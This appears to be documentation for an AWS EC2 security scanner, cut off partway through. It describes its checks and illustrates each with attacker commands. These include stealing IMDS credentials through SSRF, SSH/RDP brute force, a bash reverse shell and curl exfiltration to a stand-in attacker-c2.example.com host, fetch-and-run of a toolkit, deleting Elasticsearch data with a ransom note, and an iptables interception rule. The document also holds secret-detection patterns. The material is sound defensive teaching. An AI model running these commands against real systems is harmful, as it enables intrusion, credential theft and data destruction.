# EC2 Security Scanner - Security Checks Documentation

## Overview

The EC2 Security Scanner performs comprehensive security assessments of Amazon EC2 instances and surrounding VPC, IAM, EBS, AMI, monitoring, and patching infrastructure. It implements 45 security checks mapped to 137 controls across 10 compliance frameworks (AWS FSBP, CIS v5.0, PCI DSS v4.0.1, HIPAA, SOC 2, ISO 27001:2022, ISO 27017:2015, ISO 27018:2019, GDPR, NIST 800-53 Rev5). This document details every check, why each one matters, the attack vector that the check prevents, and the underlying boto3 API used.

## Official AWS Documentation

| Topic | AWS Documentation |
|-------|-------------------|
| EC2 Security Best Practices | [EC2 Security](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-security.html) |
| Instance Metadata Service v2 (IMDSv2) | [Configure IMDS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html) |
| Security Groups | [VPC Security Groups](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-groups.html) |
| Network ACLs | [Network ACLs](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html) |
| EBS Encryption | [EBS Encryption](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html) |
| EBS Snapshot Block Public Access | [Snapshot BPA](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/block-public-access-snapshots.html) |
| VPC Flow Logs | [Flow Logs](https://docs.aws.amazon.com/vpc/latest/userguide/flow-logs.html) |
| VPC Block Public Access | [VPC BPA](https://docs.aws.amazon.com/vpc/latest/userguide/security-vpc-bpa.html) |
| AWS CloudTrail | [CloudTrail User Guide](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-user-guide.html) |
| Amazon GuardDuty Runtime Monitoring | [GuardDuty Runtime](https://docs.aws.amazon.com/guardduty/latest/ug/runtime-monitoring.html) |
| Amazon Inspector v2 | [Inspector v2](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html) |
| AWS Systems Manager Patch Manager | [SSM Patch Manager](https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-patch.html) |
| EC2 Instance Connect Endpoints | [Instance Connect Endpoints](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/connect-using-eice.html) |
| Site-to-Site VPN (IKEv2) | [VPN Tunnel Options](https://docs.aws.amazon.com/vpn/latest/s2svpn/VPNTunnels.html) |
| AWS Backup for EBS | [AWS Backup EBS](https://docs.aws.amazon.com/aws-backup/latest/devguide/assigning-resources.html) |
| IAM Roles for EC2 | [IAM Roles for EC2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html) |
| AWS Security Hub EC2 Controls | [Security Hub EC2 Controls](https://docs.aws.amazon.com/securityhub/latest/userguide/ec2-controls.html) |
| AWS Foundational Security Best Practices | [FSBP Standard](https://docs.aws.amazon.com/securityhub/latest/userguide/fsbp-standard.html) |

---

## Security Check Categories

- [A. Instance Security](#a-instance-security) (8 checks)
- [B. Network Security](#b-network-security) (11 checks)
- [C. Storage Security](#c-storage-security) (7 checks)
- [D. Access Control](#d-access-control) (4 checks)
- [E. Logging & Monitoring](#e-logging--monitoring) (4 checks)
- [F. Patch & Vulnerability Management](#f-patch--vulnerability-management) (3 checks)
- [G. Network Exposure](#g-network-exposure) (5 checks)
- [H. Tagging & Inventory](#h-tagging--inventory) (3 checks)

---

## A. Instance Security

### 1. IMDSv2 Enforcement

**Check Details:**
- **Function:** `check_imdsv2`
- **Description:** Verifies that the Instance Metadata Service v2 (IMDSv2) is required (`HttpTokens=required`). IMDSv1 allows unauthenticated GET requests against `169.254.169.254`, while IMDSv2 requires a session token obtained via PUT.
- **Severity:** HIGH
- **FSBP Control:** EC2.8
- **CIS v5.0 Control:** 5.7
- **What's Checked:**
  - `MetadataOptions.HttpTokens` equals `required`
  - `MetadataOptions.HttpPutResponseHopLimit` (warning if > 2; AWS default is 2)
  - Container workloads (ECS/EKS on EC2) often need a hop-limit of 2 to allow the container network namespace to reach IMDS.

**Why This Check is Critical:**
The instance metadata service exposes temporary IAM role credentials at `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`. With IMDSv1, any application with an SSRF (Server-Side Request Forgery) vulnerability or any local low-privileged process can fetch those credentials over a single HTTP GET. IMDSv2 requires a short-lived session token that the SSRF target almost certainly cannot obtain, blocking the attack class entirely.

**Attack Vector When Check Fails:**

**Step 1: Reconnaissance**
```bash
# Attacker discovers SSRF vulnerability in a web app running on EC2
curl "https://target.example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# Returns: ami-id, hostname, iam/, ...
```

**Step 2: Exploitation - Steal IAM Role Credentials**
```bash
# List the attached role
curl "https://target.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Returns: web-app-role

# Steal the temporary credentials
curl "https://target.example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role"
# Returns: AccessKeyId, SecretAccessKey, Token (valid up to 6 hours)
```

**Step 3: Lateral Movement**
```bash
# Attacker uses stolen credentials from their own machine
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws s3 ls
aws ec2 describe-instances
aws iam list-attached-role-policies --role-name web-app-role
```

**Real-World Impact:**
- **Capital One (2019):** A SSRF vulnerability in a Web Application Firewall on EC2 was used to query IMDSv1, steal the attached IAM role credentials, and exfiltrate roughly 100 million customer records (including ~140,000 SSNs and ~80,000 bank account numbers) from S3. The breach resulted in an $80M fine from the OCC and $190M class-action settlement. AWS subsequently introduced IMDSv2 specifically to mitigate this attack pattern.

---

### 2. Public IPv4 Address Detection

**Check Details:**
- **Function:** `check_public_ip`
- **Description:** Identifies EC2 instances assigned a public IPv4 address (either directly or through a network interface association).
- **Severity:** HIGH
- **FSBP Control:** EC2.9
- **What's Checked:** `Instance.PublicIpAddress` set, or `NetworkInterfaces[].Association.PublicIp` set.

**Why This Check is Critical:**
Public IPv4 addresses make instances directly reachable from the internet. Even with restrictive security groups, a public IP exposes the instance to mass internet scanning (Censys, Shodan, opportunistic botnets), increases the blast radius of any future SG misconfiguration, and shortens the time-to-compromise from "weeks" (if discoverable) to "minutes" (if reachable). Workloads should sit in private subnets behind NAT, ALB, or VPC Endpoints whenever possible.

**Attack Vector When Check Fails:**

**Step 1: Reconnaissance**
```bash
# Attacker uses Shodan / Censys to find AWS public IPs
shodan search 'org:"AMAZON-AES" port:22'
shodan search 'org:"AMAZON-AES" port:3306'
nmap -Pn -p- 54.x.y.z
```

**Step 2: Service Fingerprinting**
```bash
# Identify exposed services
nmap -sV -sC -p 22,80,443,3306,5432 54.x.y.z
curl -I http://54.x.y.z
```

**Step 3: Exploitation**
```bash
# Brute-force, exploit a known CVE on the exposed service,
# or simply retry the SSH/RDP credential stuffing attack
hydra -L users.txt -P passwords.txt ssh://54.x.y.z
```

**Real-World Impact:**
- **Tesla (2018, RedLock report):** A publicly exposed Kubernetes administrative console on a Tesla EC2 instance was discovered by attackers and used to deploy cryptocurrency mining malware in Tesla's AWS environment. The console had no authentication; the public IP address made discovery trivial.

---

### 3. IAM Instance Profile Attached

**Check Details:**
- **Function:** `check_iam_profile`
- **Description:** Confirms an IAM instance profile is attached so the instance can use temporary, role-based credentials instead of long-term access keys baked into the AMI or UserData.
- **Severity:** MEDIUM
- **What's Checked:** `Instance.IamInstanceProfile` is present.

**Why This Check is Critical:**
Instances without an IAM profile typically authenticate to AWS APIs by reading long-term IAM user access keys from environment variables, config files, or UserData. Long-term keys are stolen far more often than temporary STS credentials, and once exfiltrated they remain valid indefinitely. Instance profiles deliver short-lived (≤ 6 hour) credentials via IMDS that rotate automatically.

**Attack Vector When Check Fails:**

**Step 1: Reconnaissance**
```bash
# Attacker compromises the instance via any vector
ssh user@compromised.example.com
```

**Step 2: Search for Long-Term Credentials**
```bash
grep -RIn "AKIA" /home /root /etc /opt /var 2>/dev/null
cat ~/.aws/credentials
env | grep -i AWS_
find / -name "*.env" 2>/dev/null -exec grep -l AWS_ {} \;
```

**Step 3: Persistent Access**
```bash
# Long-term keys stay valid until manually rotated, often never
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
aws sts get-caller-identity
aws iam create-access-key --user-name <victim>  # Establish persistence
```

---

### 4. Exposed Secrets in UserData

**Check Details:**
- **Function:** `check_userdata_secrets`
- **Description:** Retrieves and base64-decodes EC2 UserData, then scans for hardcoded credentials, API tokens, private keys, and connection strings.
- **Severity:** CRITICAL
- **What's Checked:** Pattern matching against AWS keys (`AKIA[0-9A-Z]{16}`, `ASIA[0-9A-Z]{16}`), `aws_secret_access_key`, password assignments, GitHub PATs (`ghp_`, `github_pat_`), GitLab PATs (`glpat-`), Stripe (`sk_live_`), SendGrid (`SG.`), Slack (`xoxb-`/`xoxp-`), Anthropic (`sk-ant-`), OpenAI (`sk-`), Vault tokens (`hvs.`), private keys (`-----BEGIN ... PRIVATE KEY-----`), DB connection strings (`://user:pass@`), generic secret keys (`DJANGO_SECRET_KEY`, `JWT_SECRET`, `ENCRYPTION_KEY`), `Authorization: Bearer`, `sshpass -p`, and Docker/CI tokens.

**Why This Check is Critical:**
UserData is base64-stored on the instance metadata and is readable by:
1. Anyone holding `ec2:DescribeInstanceAttribute` for the instance.
2. Any process on the instance via IMDS (`/latest/user-data`) — including unprivileged users by default.
3. Anyone viewing the EC2 console's "User data" tab.

It is one of the most commonly abused locations for secrets in AWS, because copy-pasting bootstrap scripts is far easier than wiring up Secrets Manager or SSM Parameter Store.

**Attack Vector When Check Fails:**

**Step 1: Reconnaissance from a Low-Privilege IAM Identity**
```bash
# Any principal with ec2:DescribeInstanceAttribute can read UserData
aws ec2 describe-instance-attribute \
  --instance-id i-0123456789abcdef0 \
  --attribute userData \
  --query 'UserData.Value' --output text | base64 -d
```

**Step 2: Reconnaissance from Inside the Instance**
```bash
# Any local process can read UserData via IMDS
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/user-data
```

**Step 3: Credential Harvesting**
```bash
# Extract every interesting pattern
grep -E "AKIA[0-9A-Z]{16}|ghp_[a-zA-Z0-9]{36}|sk_live_|password\s*=" userdata.txt
```

**Real-World Impact:**
- **Imperva (2019):** An AWS API key obtained from the production environment of an EC2 instance (introduced during a 2017 cloud migration when a snapshot of the customer database was made accessible) was used by attackers to exfiltrate Cloud WAF customer data including email addresses, hashed passwords, and TLS keys. The lesson Imperva publicly drew was the same: API keys in EC2 environments should be temporary, scoped, and never long-lived.
- **Uber (2016):** Engineers committed AWS credentials to a private GitHub repository accessed by attackers; the credentials were used to download an S3 backup containing 57M rider and driver records. While not strictly a UserData incident, it illustrates the same root cause that this check defends against: long-term credentials embedded next to code.

---

### 5. Virtualization Type (HVM Required)

**Check Details:**
- **Function:** `check_virtualization`
- **Description:** EC2 paravirtual (PV) instances should not be used. HVM provides hardware-assisted virtualization with stronger isolation between guest and hypervisor.
- **Severity:** MEDIUM
- **FSBP Control:** EC2.24
- **What's Checked:** `Instance.VirtualizationType == "hvm"`.

**Why This Check is Critical:**
Paravirtual instances rely on guest-to-hypervisor cooperation through hypercalls, exposing a wider attack surface than HVM. AWS has been deprecating PV AMIs since 2017; running on PV typically means the instance is on legacy infrastructure that lacks modern security features (Nitro, hardware-enforced isolation, SR-IOV networking).

**Attack Vector When Check Fails:**

**Step 1: Identify Legacy Infrastructure**
```bash
aws ec2 describe-instances \
  --query 'Reservations[].Instances[?VirtualizationType==`paravirtual`].[InstanceId,InstanceType,LaunchTime]'
```

**Step 2: Exploit Stale Underlying Hypervisor**
- PV-only instance families predate Nitro and have a longer history of disclosed hypervisor vulnerabilities.
- Side-channel attacks (Spectre/Meltdown variants) historically had higher exploitability on PV than HVM.

---

### 6. Network Interface Count

**Check Details:**
- **Function:** `check_network_interfaces`
- **Description:** Flags instances with more than one ENI attached. Multi-ENI instances often bridge subnets or VPCs that should remain isolated.
- **Severity:** LOW
- **FSBP Control:** EC2.17
- **What's Checked:** `len(Instance.NetworkInterfaces) > 1`.

**Why This Check is Critical:**
Dual-homed EC2 instances (e.g., one ENI in a private subnet and another in a DMZ subnet) sidestep the security boundary intended by VPC subnet design. An attacker landing on the box via the public ENI can pivot directly into private resources without crossing a NAT, NACL, or routing decision.

**Attack Vector When Check Fails:**

**Step 1: Identify Dual-Homed Targets**
```bash
aws ec2 describe-instances \
  --query 'Reservations[].Instances[?length(NetworkInterfaces) > `1`].[InstanceId,NetworkInterfaces[].SubnetId]'
```

**Step 2: Bridge Across Subnets After Compromise**
```bash
# After landing on the public-facing ENI's IP
ip addr show
# eth0: 10.0.1.5  (DMZ subnet)
# eth1: 10.0.99.5 (private subnet — RDS, internal services)

# Pivot — internal targets are now one hop away
nmap -sT 10.0.99.0/24
```

---

### 7. Detailed Monitoring

**Check Details:**
- **Function:** `check_monitoring`
- **Description:** Verifies CloudWatch detailed monitoring (1-minute granularity) is enabled. Default basic monitoring publishes metrics every 5 minutes, which is too coarse to catch short-lived spikes (cryptojacking, DDoS, exfiltration bursts).
- **Severity:** MEDIUM
- **What's Checked:** `Instance.Monitoring.State == "enabled"`.

**Why This Check is Critical:**
At 5-minute resolution, a 4-minute CPU spike from a cryptominer or a 3-minute outbound bandwidth burst from a data exfiltration is invisible. 1-minute resolution is the minimum useful granularity for autoscaling, alarming, and anomaly detection.

**Attack Vector When Check Fails:**

**Step 1: Time the Attack to the Monitoring Window**
```bash
# Cryptominer that throttles itself off every 4 minutes
while true; do
  ./xmrig --url pool.example.com:3333 --threads 8 &
  PID=$!
  sleep 240
  kill $PID
  sleep 60
done
# At 5-minute averages, CPU appears nominal
```

---

### 8. Key Pair Usage vs SSM-Managed Access

**Check Details:**
- **Function:** `check_key_pair`
- **Description:** Flags instances that have a key pair attached but are not registered with SSM. SSH key pairs imply manual ssh/rsync workflows — error-prone, hard to audit, and often left in place after employees leave.
- **Severity:** MEDIUM
- **What's Checked:** `Instance.KeyName` is set AND the instance is NOT in SSM `describe_instance_information` results.

**Why This Check is Critical:**
SSH keys distributed across a fleet are extremely difficult to rotate or revoke. SSM Session Manager and EC2 Instance Connect provide the same operational access through IAM, with full session logging to CloudTrail/CloudWatch and no inbound port 22 needed.

**Attack Vector When Check Fails:**

**Step 1: Steal the Key**
```bash
# Stolen from a former employee's laptop, leaked GitHub repo, or backup
cp stolen-key.pem ~/.ssh/
chmod 600 ~/.ssh/stolen-key.pem
```

**Step 2: Direct Login Without Audit Trail**
```bash
ssh -i ~/.ssh/stolen-key.pem ec2-user@target.example.com
# CloudTrail shows nothing — the connection is purely TCP to port 22
```

---

## B. Network Security

### 1. VPC Flow Logs Enabled

**Check Details:**
- **Function:** `check_vpc_flow_logs`
- **Description:** VPC Flow Logs capture metadata for IP traffic flowing through ENIs. Without them, post-incident network forensics is impossible.
- **Severity:** MEDIUM
- **FSBP Control:** EC2.6
- **CIS v5.0 Control:** 3.7
- **What's Checked:** Each VPC has at least one active flow log (`describe_flow_logs` filtered by `resource-id`).

**Why This Check is Critical:**
Without flow logs, an analyst responding to a breach cannot answer "what did the attacker connect to?" or "did data leave the VPC?". Flow logs are the network equivalent of CloudTrail and are required by HIPAA, PCI DSS, and CIS.

**Attack Vector When Check Fails:**

**Step 1: Silent Exfiltration**
```bash
# Attacker tunnels stolen data to their C2 over HTTPS
curl -X POST -d @stolen-data.tar.gz https://attacker-c2.example.com/upload
# Without flow logs, no record of the destination IP / port / byte count exists
```

**Step 2: Forensic Blindness**
```bash
# Incident responders cannot reconstruct:
# - which external IPs the instance contacted
# - the volume of data transferred
# - whether lateral connections to other VPCs occurred
```

---

### 2. SSH (Port 22) Open to 0.0.0.0/0

**Check Details:**
- **Function:** `check_sg_ssh`
- **Description:** Detects security groups allowing inbound TCP port 22 from `0.0.0.0/0` or `::/0`.
- **Severity:** HIGH
- **FSBP Control:** EC2.13
- **What's Checked:** `IpPermissions` entries with `FromPort<=22<=ToPort`, protocol `tcp` or `-1`, and source CIDR `0.0.0.0/0` or `::/0`.

**Why This Check is Critical:**
Port 22 exposed to the internet is the most-attacked endpoint on AWS. Every public SSH port receives credential-stuffing attempts within minutes of being exposed. The correct pattern is SSM Session Manager (no inbound port at all) or an EC2 Instance Connect Endpoint.

**Attack Vector When Check Fails:**

**Step 1: Internet-Wide Discovery**
```bash
shodan search 'port:22 "SSH-2.0-OpenSSH" cloud:aws'
masscan -p22 0.0.0.0/0 --rate=100000
```

**Step 2: Credential Stuffing**
```bash
hydra -L common-users.txt -P rockyou.txt -t 8 ssh://<public_ip>
patator ssh_login host=<public_ip> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```

**Step 3: Post-Exploitation**
```bash
# Once in, escalate via misconfigured sudoers, kernel exploit,
# or simply harvest IMDS credentials (see check #1)
```

---

### 3. RDP (Port 3389) Open to 0.0.0.0/0

**Check Details:**
- **Function:** `check_sg_rdp`
- **Description:** Detects security groups allowing inbound TCP port 3389 from `0.0.0.0/0` or `::/0`.
- **Severity:** HIGH
- **FSBP Control:** EC2.14
- **What's Checked:** `IpPermissions` entries with `FromPort<=3389<=ToPort`, protocol `tcp` or `-1`, and source CIDR `0.0.0.0/0` or `::/0`.

**Why This Check is Critical:**
RDP is heavily abused by ransomware operators (Ryuk, Conti, REvil, Phobos). BlueKeep (CVE-2019-0708) demonstrated wormable pre-authentication RCE. Public RDP should never exist; use Fleet Manager Remote Desktop via SSM, or Instance Connect Endpoints with RDP forwarding.

**Attack Vector When Check Fails:**

**Step 1: Discovery**
```bash
shodan search 'port:3389 country:US cloud:aws'
masscan -p3389 <ip-range> --rate=10000
```

**Step 2: Brute Force / Vulnerability Exploit**
```bash
crowbar -b rdp -s <public_ip>/32 -u Administrator -C passwords.txt
# Or: BlueKeep / DejaBlue if patches are missing
```

---

### 4. High-Risk Ports Open to World

**Check Details:**
- **Function:** `check_sg_high_risk_ports`
- **Description:** Detects SG rules allowing `0.0.0.0/0` or `::/0` to any of 24 high-risk ports: 20, 21, 22, 23, 25, 110, 135, 143, 445, 1433, 1434, 3000, 3306, 3389, 4333, 5000, 5432, 5500, 5601, 8080, 8088, 8888, 9200, 9300.
- **Severity:** CRITICAL
- **FSBP Control:** EC2.19
- **What's Checked:** Inbound rules whose port range overlaps any of the 24 ports above with a public CIDR. Note: ports 22 and 3389 are also covered individually by checks B.2 and B.3, but score deductions do **not** stack — only the highest single SG penalty per instance is applied.

**Why This Check is Critical:**
This list covers the services attackers fingerprint and target first: databases (3306 MySQL, 5432 Postgres, 1433 MSSQL, 27017 MongoDB), caches (6379 Redis), search (9200/9300 Elasticsearch, 5601 Kibana), file shares (445 SMB), legacy admin (23 Telnet, 21 FTP), web admin panels (3000 dev, 8080/8088/8888 management), and SMTP relay (25). Almost every well-known AWS data leak begins with one of these on a public IP.

**Attack Vector When Check Fails:**

**Step 1: Internet-Scale Service Discovery**
```bash
masscan -p3306,5432,9200,27017,6379 0.0.0.0/0 --rate=100000 -oG db-scan.txt
```

**Step 2: Direct Database Access (Common: No Auth on Default Configs)**
```bash
# MongoDB without auth (the famous "MongoDB ransom" attacks)
mongo mongodb://<public_ip>:27017
> show dbs

# Redis without auth
redis-cli -h <public_ip>
> KEYS *

# Elasticsearch
curl http://<public_ip>:9200/_cat/indices
curl http://<public_ip>:9200/users/_search
```

**Step 3: Data Theft / Ransom**
```bash
# Dump the database
mysqldump -h <public_ip> -u root --all-databases > exfil.sql

# Or — typical for unauth Mongo/Redis/Elastic — drop and ransom
curl -X DELETE http://<public_ip>:9200/_all
echo "Send 0.5 BTC to bc1q... to recover" > READ_ME.txt
```

---

### 5. Remote Admin Ports Open to World (Composite)

**Check Details:**
- **Function:** `check_sg_remote_admin`
- **Description:** Composite check for any remote-administration port (SSH, RDP, WinRM, VNC, Telnet, SMB) reachable from `0.0.0.0/0` or `::/0`. Maps to FSBP EC2.53 (IPv4) and EC2.54 (IPv6).
- **Severity:** HIGH
- **FSBP Controls:** EC2.53, EC2.54
- **CIS v5.0 Controls:** 5.3 (IPv4), 5.4 (IPv6)
- **What's Checked:** Any SG rule on a remote admin port with a public CIDR. Result fields: `open_to_ipv4`, `open_to_ipv6`.

**Why This Check is Critical:**
This is the umbrella version of B.2/B.3 that catches less-common admin ports (VNC 5900, WinRM 5985/5986, Telnet 23) which are equally dangerous when world-exposed.

**Attack Vector When Check Fails:**

**Step 1: Service Identification**
```bash
nmap -sV -p 22,23,3389,5900,5985,5986 <target>
```

**Step 2: Protocol-Specific Exploit**
```bash
# WinRM (port 5985 cleartext / 5986 TLS)
evil-winrm -i <public_ip> -u Administrator -p Password123!

# VNC
vncviewer <public_ip>::5900
```

---

### 6. Unrestricted Egress

**Check Details:**
- **Function:** `check_sg_egress`
- **Description:** Detects security groups allowing outbound traffic to `0.0.0.0/0` or `::/0` on all protocols/ports (`IpProtocol: '-1'`, or port range `0-65535`).
- **Severity:** MEDIUM
- **What's Checked:** `IpPermissionsEgress` entries with public destination CIDR and `IpProtocol == -1` (or `tcp`/`udp` with port range covering 0-65535).

**Why This Check is Critical:**
The default SG egress rule allows all outbound. This is convenient but it means a compromised instance can:
- Exfiltrate data to attacker-controlled C2
- Pull down second-stage malware from arbitrary hosts
- Participate in DDoS or cryptomining (outbound to mining pools)
- Connect to AWS APIs in attacker accounts to escalate

Egress should be restricted to required destinations (S3 endpoints, package mirrors, monitoring SaaS).

**Attack Vector When Check Fails:**

**Step 1: Establish C2**
```bash
# Reverse shell to attacker over HTTPS (looks like normal traffic)
bash -i >& /dev/tcp/attacker-c2.example.com/443 0>&1
```

**Step 2: Stage Tools and Exfiltrate**
```bash
curl -O https://attacker-c2.example.com/lateral-movement-toolkit.tgz
tar xzf lateral-movement-toolkit.tgz && ./run.sh

# Exfil
tar czf - /var/lib/secrets | curl --data-binary @- https://attacker-c2.example.com/upload
```

---

### 7. Authorized Ports Enforcement

**Check Details:**
- **Function:** `check_sg_authorized_ports`
- **Description:** Inbound rules with source `0.0.0.0/0` or `::/0` should only permit ports on a configurable allow-list (default: 80, 443). Any other open port is flagged. This is broader than B.4 (which targets a specific high-risk list) — it catches arbitrary "developer-opened" ports.
- **Severity:** HIGH
- **FSBP Control:** EC2.18
- **What's Checked:** All `IpPermissions` entries with public CIDR; flag if destination port is NOT in the configured allow-list.

**Why This Check is Critical:**
A common pattern is a developer opening port 8000 or 9000 "just for testing" and forgetting it. EC2.18 codifies the principle that the only ports allowed open to the world should be a deliberate short list (typically just 80/443 fronted by an ALB). Anything else needs justification.

**Attack Vector When Check Fails:**

**Step 1: Find the Forgotten Port**
```bash
nmap -p- <public_ip>
# Discovers port 9000 open
curl http://<public_ip>:9000/
# "Welcome to PHP debug console v0.3"
```

**Step 2: Exploit Dev/Debug Endpoint**
```bash
curl "http://<public_ip>:9000/debug?cmd=cat+/etc/passwd"
```

---

### 8. NACL Admin Port Exposure

**Check Details:**
- **Function:** `check_nacl_admin_ports`
- **Description:** Network ACLs should not allow `0.0.0.0/0` ingress to ports 22 or 3389. NACLs are stateless and act as a subnet-wide allow/deny list — an over-permissive NACL undermines per-SG restrictions.
- **Severity:** MEDIUM
- **FSBP Control:** EC2.21
- **CIS v5.0 Control:** 5.2
- **What's Checked:** NACL `Entries` with `RuleAction == "allow"`, `CidrBlock == "0.0.0.0/0"`, and port range covering 22 or 3389.

**Why This Check is Critical:**
NACLs are evaluated before SGs at the subnet boundary. A "permissive default + restrictive SG" pattern is fragile: if anyone later attaches a more permissive SG to a new instance in the subnet, the NACL no longer protects it. Defense in depth requires both layers to deny.

**Attack Vector When Check Fails:**

**Step 1: Map the Permissive Subnet**
```bash
aws ec2 describe-network-acls \
  --query 'NetworkAcls[].Entries[?CidrBlock==`0.0.0.0/0` && RuleAction==`allow`]'
```

**Step 2: Wait for an SG Mistake**
- A new instance gets launched into the same subnet with a default SG that someone modified to allow port 22 from anywhere
- The NACL doesn't block it → instant exposure

---

### 9. Source/Destination Check

**Check Details:**
- **Function:** `check_source_dest`
- **Description:** ENI source/destination check should be enabled, except for legitimate NAT, VPN, or firewall instances. When disabled, an instance can forward traffic for arbitrary IPs.
- **Severity:** MEDIUM
- **FSBP Control:** EC2.180
- **What's Checked:** `NetworkInterface.SourceDestCheck == true`.

**Why This Check is Critical:**
With source/dest check disabled, a compromised instance can act as a router and intercept or relay traffic for other instances in the VPC, enabling man-in-the-middle attacks against intra-VPC traffic.

**Attack Vector When Check Fails:**

**Step 1: Identify Instances with Check Disabled**
```bash
aws ec2 describe-network-interfaces \
  --query 'NetworkInterfaces[?SourceDestCheck==`false`].[NetworkInterfaceId,Attachment.InstanceId]'
```

**Step 2: Set Up Traffic Interception**
```bash
# After compromising the instance, alter route tables (or send gratuitous ARP)
# to make peer instances send traffic through the attacker's box
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to attacker-tls-mitm:443
```

---

### 10. Subnet Auto-Assign Public IP

**Check Details:**
- **Function:** `check_subnet_auto_assign`
- **Description:** Subnets should not automatically assign public IPv4 addresses to instances launched into them.
- **Severity:** MEDIUM
- **FSBP Control:** EC2.15
- **What's Checked:** `Subnet.MapPublicIpOnLaunch == false`.

**Why This Check is Critical:**
Auto-assign-public-IP makes any new instance in the subnet immediately internet-reachable, even if the operator forgot to specify `--no-associate-public-ip-address` on launch. This silently expands attack surface every time a new instance is created.

**Attack Vector When Check Fails:**

**Step 1: Anticipate New Exposure**
```bash
# Attacker continuously scans the AWS public ranges for new IPs in
# the suspected /24, knowing the customer auto-assigns
masscan 54.x.y.0/24 -p22,80,443 --rate=10000
```

---

### 11. VPC Block Public Access

**Check Details:**
- **Function:** `check_vpc_bpa`
- **Description:** VPC Block Public Access (BPA) is an account/region setting that blocks internet gateway traffic for all VPCs in the region. It is the EC2/VPC analogue of S3 BPA.
- **Severity:** HIGH
- **FSBP Control:** EC2.172
- **What's Checked:** `describe_vpc_block_public_access_options` → `InternetGatewayBlockMode` is `block-bidirectional` or `block-ingress`.

**Why This Check is Critical:**
VPC BPA is a single account-wide kill switch. With it on, even a misconfigured public subnet + public IP + open SG will not be reachable from the internet. It is the strongest available "default-deny" control for VPC ingress.

**Attack Vector When Check Fails:**

**Step 1: Misconfiguration Cascades**
- Without BPA, a single SG mistake on a single instance in a single VPC is enough to expose it
- With BPA, multiple controls would have to fail simultaneously

---

### 12. Transit Gateway Auto-Accept VPC Attachments

**Check Details:**
- **Function:** `check_transit_gateway`
- **Description:** Transit Gateways should not have `AutoAcceptSharedAttachments == enable`. Auto-accept lets any VPC in the account (or shared via RAM) attach without operator approval.
- **Severity:** HIGH
- **FSBP Control:** EC2.23
- **What's Checked:** `TransitGateway.Options.AutoAcceptSharedAttachments == "disable"`.

**Why This Check is Critical:**
A TGW with auto-accept on, plus RAM sharing to other accounts (or to an over-permissive Organization), means any of those accounts can join the network. An attacker who compromises a single peripheral account can pivot directly into the hub network.

**Attack Vector When Check Fails:**

**Step 1: Attach a Hostile VPC**
```bash
# Attacker controls a peripheral account that the TGW is shared with
aws ec2 create-transit-gateway-vpc-attachment \
  --transit-gateway-id tgw-shared-with-me \
  --vpc-id vpc-attacker \
  --subnet-ids subnet-attacker
# With auto-accept = enable, the attachment is live immediately
```

**Step 2: Route into the Hub Network**
```bash
# Attacker's instance now has L3 reachability to the entire TGW-connected estate
nmap -sT 10.0.0.0/8
```

---

### 13. VPN IKEv2 Enforcement

**Check Details:**
- **Function:** `check_vpn_ikev2`
- **Description:** Site-to-Site VPN tunnels should use IKEv2. IKEv1 is deprecated, lacks modern crypto agility, and has known weaknesses (PSK offline cracking, aggressive-mode reflection).
- **Severity:** HIGH
- **FSBP Control:** EC2.183
- **What's Checked:** `describe_vpn_connections` → each `Options.TunnelOptions[].IkeVersions` should include only `ikev2`.

**Why This Check is Critical:**
IKEv1 with aggressive mode is vulnerable to offline PSK cracking attacks. IKEv2 supports stronger DH groups, EAP authentication, mobility (MOBIKE), and dead-peer detection that's been hardened against the issues IKEv1 still carries. RFC 8247 and NIST SP 800-77 Rev1 both deprecate IKEv1.

**Attack Vector When Check Fails:**

**Step 1: Capture IKEv1 Aggressive Mode Handshake**
```bash
# Attacker on the path between on-prem and AWS captures the handshake
tcpdump -i eth0 -w ike.pcap udp port 500
ikeforce.py -t <vpn_endpoint> -e
```

**Step 2: Offline PSK Cracking**
```bash
psk-crack -d wordlist.txt ike-psk-handshake.txt
# Pre-shared keys with low entropy fall in minutes
```

**Step 3: Decrypt VPN Traffic**
```bash
# With the PSK, attacker can decrypt captured tunnel traffic
# or impersonate the peer to inject traffic into the VPC
```

---

## C. Storage Security

### 1. EBS Volume Encryption

**Check Details:**
- **Function:** `check_ebs_encryption`
- **Description:** All attached EBS volumes should be encrypted at rest.
- **Severity:** MEDIUM
- **FSBP Control:** EC2.3
- **What's Checked:** Each `Volume.Encrypted == true` for volumes attached to the instance.

**Why This Check is Critical:**
Unencrypted volumes mean snapshots, replicated copies, and any future data lifecycle event leaves data in plaintext on AWS storage. Encryption ensures that an attacker with snapshot copy permissions, or a misconfigured snapshot share, cannot read the contents.

**Attack Vector When Check Fails:**

**Step 1: Snapshot the Volume**
```bash
# Attacker (or insider) with ec2:CreateSnapshot
aws ec2 create-snapshot --volume-id vol-0abc... --description "backup"
```

**Step 2: Share / Copy / Mount**
```bash
# Share to attacker account, mount in attacker VPC, read plaintext
aws ec2 modify-snapshot-attribute --snapshot-id snap-... \
  --create-volume-permission "Add=[{UserId=222222222222}]"
```

---

### 2. EBS Default Encryption

**Check Details:**
